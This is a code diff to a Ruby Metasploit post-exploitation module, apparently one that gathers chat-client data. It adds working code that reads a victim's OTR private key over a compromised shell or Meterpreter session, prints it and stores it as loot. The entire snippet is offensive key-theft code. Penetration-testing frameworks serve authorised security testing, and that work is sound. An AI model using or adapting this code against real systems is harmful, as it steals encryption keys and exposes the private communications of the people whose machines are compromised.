@@ -216,6 +216,23 @@ class Metasploit3 < Msf::Post
 				end
 			end
 
+			#Grab otr.private_key
+			otr_key = ""
+			if session.type == "shell"
+				otr_key = session.shell_command("cat #{path}/otr.private_key")
+			else
+				f = session.fs.file.new("#{path}/otr.private_key", "rb")
+				until f.eof?
+					otr_key << f.read
+				end
+			end
+
+			if otr_key !~ /No such file/
+				print_status("OTR Key: #{otr_key.to_s}")
+				store_loot("otr.private_key", "text/plain", session, otr_key.to_s, "otr.private_key", "otr.private_key")
+			end
+
+
 		end
 
 		if datastore['CONTACTS']
